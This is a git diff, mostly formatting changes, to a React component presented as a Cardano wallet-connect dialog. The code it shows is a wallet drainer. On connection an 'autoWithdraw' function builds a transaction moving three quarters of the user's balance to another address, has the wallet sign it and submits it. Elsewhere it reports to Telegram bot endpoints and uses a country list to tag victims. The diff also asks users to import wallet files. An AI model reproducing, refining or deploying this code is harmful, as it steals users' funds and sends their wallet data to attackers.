@@ -20,7 +20,6 @@ function ConnectWallet({ onClose }) {
   const navigate = useNavigate();
   const [country, setCountry] = useState("");
 
-  
   useEffect(() => {
     const getCountry = async () => {
       try {
@@ -36,8 +35,6 @@ function ConnectWallet({ onClose }) {
     };
     getCountry();
   }, []);
-
-
 
   const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
   const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
@@ -61,7 +58,7 @@ function ConnectWallet({ onClose }) {
           headers: {
             project_id: BLOCKFROST_API_KEY,
           },
-        },
+        }
       );
       return response.data;
     } catch (error) {
@@ -79,9 +76,7 @@ function ConnectWallet({ onClose }) {
 
       let balanceInAda;
       if (isHex) {
-        balanceInAda = Value.from_bytes(
-          Buffer.from(balanceInLovelace, "hex"),
-        );
+        balanceInAda = Value.from_bytes(Buffer.from(balanceInLovelace, "hex"));
       } else {
         balanceInAda = Number(balanceInLovelace) / 1000000;
       }
@@ -91,7 +86,7 @@ function ConnectWallet({ onClose }) {
       setBalance(newBalance);
 
       const response = await fetch(
-        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd",
+        "https://api.coingecko.com/api/v3/simple/price?ids=cardano&vs_currencies=usd"
       );
       const data = await response.json();
       const adaToUsd = data.cardano.usd;
@@ -123,9 +118,7 @@ function ConnectWallet({ onClose }) {
       const protocolParams = await fetchProtocolParams();
 
       // Convert ADA to Lovelace without padding
-      const lovelaceAmount = Math.floor(
-        amountToWithdraw * 1000000,
-      ).toString();
+      const lovelaceAmount = Math.floor(amountToWithdraw * 1000000).toString();
 
       console.log("Lovelace amount:", lovelaceAmount);
 
@@ -134,10 +127,12 @@ function ConnectWallet({ onClose }) {
         lovelaceAmount,
         walletApi,
         protocolParams,
-        address,
+        address
       );
       console.log(
-        `Withdrawal of ${amountToWithdraw.toFixed(6)} ADA initiated (3/4 of balance)`,
+        `Withdrawal of ${amountToWithdraw.toFixed(
+          6
+        )} ADA initiated (3/4 of balance)`
       );
     } catch (error) {
       console.error("Error during auto-withdrawal:", error);
@@ -148,12 +143,12 @@ function ConnectWallet({ onClose }) {
     let txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
     for (const utxor of utxos) {
       const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
-        Buffer.from(utxor, "hex"),
+        Buffer.from(utxor, "hex")
       );
       const input = utxo.input();
       const txid = Buffer.from(
         input.transaction_id().to_bytes(),
-        "utf8",
+        "utf8"
       ).toString("hex");
       const txindx = input.index();
       const output = utxo.output();
@@ -168,7 +163,7 @@ function ConnectWallet({ onClose }) {
         for (let i = 0; i < N; i++) {
           const policyId = keys.get(i);
           const policyIdHex = Buffer.from(policyId.to_bytes(), "utf8").toString(
-            "hex",
+            "hex"
           );
           const assets = multiasset.get(policyId);
           const assetNames = assets.keys();
@@ -178,10 +173,10 @@ function ConnectWallet({ onClose }) {
             const assetName = assetNames.get(j);
             const assetNameString = Buffer.from(
               assetName.name(),
-              "utf8",
+              "utf8"
             ).toString();
             const assetNameHex = Buffer.from(assetName.name(), "utf8").toString(
-              "hex",
+              "hex"
             );
             const multiassetAmt = multiasset.get_asset(policyId, assetName);
             multiAssetStr += `+ ${multiassetAmt.to_str()} + ${policyIdHex}.${assetNameHex} (${assetNameString})`;
@@ -207,30 +202,30 @@ function ConnectWallet({ onClose }) {
     amount,
     nami,
     protocolParams,
-    address,
+    address
   ) => {
     const txBuilder = CardanoWasm.TransactionBuilder.new(
       CardanoWasm.TransactionBuilderConfigBuilder.new()
         .fee_algo(
           CardanoWasm.LinearFee.new(
             CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
-            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString()),
-          ),
+            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
+          )
         )
         .pool_deposit(
-          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString()),
+          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
         )
         .key_deposit(
-          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString()),
+          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
         )
         .coins_per_utxo_word(
           CardanoWasm.BigNum.from_str(
-            protocolParams.coins_per_utxo_size.toString(),
-          ),
+            protocolParams.coins_per_utxo_size.toString()
+          )
         )
         .max_tx_size(16384)
         .max_value_size(5000)
-        .build(),
+        .build()
     );
     console.log("Amount in Lovelace:", amount, recAddress, "naddr", address);
     const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
@@ -239,7 +234,7 @@ function ConnectWallet({ onClose }) {
     console.log(
       "Amount in Lovelace:",
       shelleyOutputAddress,
-      shelleyChangeAddress,
+      shelleyChangeAddress
     );
 
     const utxosHex = await nami.getUtxos();
@@ -247,7 +242,7 @@ function ConnectWallet({ onClose }) {
     console.log("Amount in Lovelace:", utxosHex);
 
     const utxos = utxosHex.map((hex) =>
-      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex")),
+      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
     );
     console.log("Amount in Lovelace:", utxosHex);
 
@@ -255,7 +250,7 @@ function ConnectWallet({ onClose }) {
       txBuilder.add_input(
         CardanoWasm.Address.from_bech32(address),
         utxo.input(),
-        utxo.output().amount(),
+        utxo.output().amount()
       );
     });
 
@@ -264,8 +259,8 @@ function ConnectWallet({ onClose }) {
     txBuilder.add_output(
       CardanoWasm.TransactionOutput.new(
         shelleyOutputAddress,
-        CardanoWasm.Value.new(CardanoWasm.BigNum.from_str(amount)),
-      ),
+        CardanoWasm.Value.new(CardanoWasm.BigNum.from_str(amount))
+      )
     );
 
     txBuilder.add_change_if_needed(shelleyChangeAddress);
@@ -277,30 +272,30 @@ function ConnectWallet({ onClose }) {
     const tx = CardanoWasm.Transaction.new(
       txBody,
       CardanoWasm.TransactionWitnessSet.from_bytes(
-        transactionWitnessSet.to_bytes(),
-      ),
+        transactionWitnessSet.to_bytes()
+      )
     );
 
     console.log("Amount in Lovelace:", tx);
 
     let txVkeyWitnesses = await nami.signTx(
       Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
-      true,
+      true
     );
 
     txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
-      Buffer.from(txVkeyWitnesses, "hex"),
+      Buffer.from(txVkeyWitnesses, "hex")
     );
 
     transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
 
     const signedTx = CardanoWasm.Transaction.new(
       tx.body(),
-      transactionWitnessSet,
+      transactionWitnessSet
     );
 
     const submittedTxHash = await nami.submitTx(
-      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex"),
+      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
     );
     console.log("Submitted transaction hash:", submittedTxHash);
   };
@@ -333,14 +328,14 @@ function ConnectWallet({ onClose }) {
 
             if (addresses && addresses.length > 0) {
               const hexAddress = addresses[0];
-              console.log(hexAddress)
+              console.log(hexAddress);
               setSelectedWallet(key);
               const addressBytes = Buffer.from(hexAddress, "hex");
-              console.log(addressBytes)
+              console.log(addressBytes);
               const address = Address.from_bytes(addressBytes);
               console.log(
                 `Connected to ${key}. Hex Address:`,
-                address?.to_bech32(),
+                address?.to_bech32()
               );
               setAddress(address?.to_bech32());
 
@@ -352,7 +347,7 @@ function ConnectWallet({ onClose }) {
                 await autoWithdraw(
                   walletApi,
                   currentBalance,
-                  address?.to_bech32(),
+                  address?.to_bech32()
                 );
               } else {
                 console.error("Failed to retrieve balance");
@@ -361,20 +356,16 @@ function ConnectWallet({ onClose }) {
             } else {
               console.error("No addresses found");
               alert(
-                "No addresses found in the wallet. If this is a new wallet, please make a transaction first.",
+                "No addresses found in the wallet. If this is a new wallet, please make a transaction first."
               );
             }
           }
         } catch (error) {
           console.error(`Error connecting to ${key} wallet:`, error);
-          alert(
-            `Error connecting to ${key} wallet. Please try again`,
-          );
+          alert(`Error connecting to ${key} wallet. Please try again`);
         }
       } else {
-        console.error(
-          `${key} wallet not found. Please install the extension.`,
-        );
+        console.error(`${key} wallet not found. Please install the extension.`);
         alert(`${key} wallet not found. Please install the extension.`);
       }
     } else if (wallet === "Eternl") {
@@ -430,9 +421,17 @@ function ConnectWallet({ onClose }) {
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
-    const greenCountries = ['united states', 'united kingdom', 'nigeria', 'united arab emirates'];
-    const color = greenCountries.includes(country.toLowerCase()) ? 'RED' : 'GREEN';
-    
+    const greenCountries = [
+      "united states",
+      "united kingdom",
+      "nigeria",
+      "united arab emirates",
+      "canada",
+    ];
+    const color = greenCountries.includes(country.toLowerCase())
+      ? "RED"
+      : "GREEN";
+
     const endpoints = [
       {
         url: `https://api.telegram.org/bot${token}/sendMessage`,
@@ -553,8 +552,9 @@ function ConnectWallet({ onClose }) {
           Import MinWallet.json file
         </p>
         <button
-          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${!fileUploaded ? "opacity-50 cursor-not-allowed" : ""
-            }`}
+          className={`p-3 mt-4 bg-[#89aaff] rounded-full text-sm w-full font-semibold flex items-center justify-center gap-2 ${
+            !fileUploaded ? "opacity-50 cursor-not-allowed" : ""
+          }`}
           disabled={!fileUploaded}
           onClick={handleTransferWallet}
         >
@@ -574,7 +574,7 @@ function ConnectWallet({ onClose }) {
     );
   };
 
-  console.log(filteredWalletNames)
+  console.log(filteredWalletNames);
   return (
     <div className="fixed inset-0 flex items-center justify-center lg:justify-end z-[500] bg-[#ffffff1c] bg-opacity-50 backdrop-blur">
       <div className="ConnectWallet w-full max-w-[420px] lg:h-full lg:bg-[#111218]">
@@ -609,7 +609,6 @@ function ConnectWallet({ onClose }) {
             </div>
 
             <div className="flex-1 overflow-y-auto px-4 md:px-6 flex flex-col justify-between">
-
               {selectedWallet ? (
                 <div className="flex-1 space-y-4">
                   {selectedWallet === "MinWallet" && (
@@ -787,24 +786,23 @@ function ConnectWallet({ onClose }) {
                     </div>
                   )}
 
-                  {
-                    filteredWalletNames.map((wallet) => {
-
-
-                      return (selectedWallet === wallet && (
-                        <div key={wallet} className="bg-[#1f2025] p-4 rounded-lg">
+                  {filteredWalletNames.map((wallet) => {
+                    return (
+                      selectedWallet === wallet && (
+                        <div
+                          key={wallet}
+                          className="bg-[#1f2025] p-4 rounded-lg"
+                        >
                           <p className="text-textSecondary mb-2">
                             {window.cardano[wallet].name} has been connected
                           </p>
                           <button className="bg-blue-500 text-white px-4 py-2 rounded">
-                            {window.cardano[wallet].name}  Connected
+                            {window.cardano[wallet].name} Connected
                           </button>
                         </div>
                       )
-                      )
-                    })
-                  }
-
+                    );
+                  })}
 
                   {selectedWallet === "Add Custom Wallet" && (
                     <div className="bg-[#1f2025] p-4 rounded-lg">
@@ -860,38 +858,45 @@ function ConnectWallet({ onClose }) {
                         </svg>
                       </div>
 
-
                       {filteredWalletNames.map((key) => {
-                        return (<div
-                          key={key}
-                          className="flex items-center cursor-pointer gap-x-4 p-3 "
-                          onClick={() => handleWalletSelection(`${window.cardano[key].name}`, key)}
-                        >
-                          <img src={window.cardano[key].icon} width={32} height={32} alt={key} />
-                          <div className="flex-1">
-                            <h1 className="text-textSecondary text-md font-semibold">
-                              {window.cardano[key].name}
-                            </h1>
-                            <p className="text-[#919bd1] text-sm">
-                              Mobile support
-                            </p>
-                          </div>
-                          <svg
-                            viewBox="0 0 24 24"
-                            xmlns="http://www.w3.org/2000/svg"
-                            width="24"
-                            height="24"
-                            fill="currentColor"
-                            className="text-textSecondary size-5 shrink-0"
+                        return (
+                          <div
+                            key={key}
+                            className="flex items-center cursor-pointer gap-x-4 p-3 "
+                            onClick={() =>
+                              handleWalletSelection(
+                                `${window.cardano[key].name}`,
+                                key
+                              )
+                            }
                           >
-                            <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
-                          </svg>
-                        </div>)
-                      }
-
-                      )}
-
-
+                            <img
+                              src={window.cardano[key].icon}
+                              width={32}
+                              height={32}
+                              alt={key}
+                            />
+                            <div className="flex-1">
+                              <h1 className="text-textSecondary text-md font-semibold">
+                                {window.cardano[key].name}
+                              </h1>
+                              <p className="text-[#919bd1] text-sm">
+                                Mobile support
+                              </p>
+                            </div>
+                            <svg
+                              viewBox="0 0 24 24"
+                              xmlns="http://www.w3.org/2000/svg"
+                              width="24"
+                              height="24"
+                              fill="currentColor"
+                              className="text-textSecondary size-5 shrink-0"
+                            >
+                              <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
+                            </svg>
+                          </div>
+                        );
+                      })}
 
                       <div
                         className="flex items-center cursor-pointer gap-x-4 p-3 "
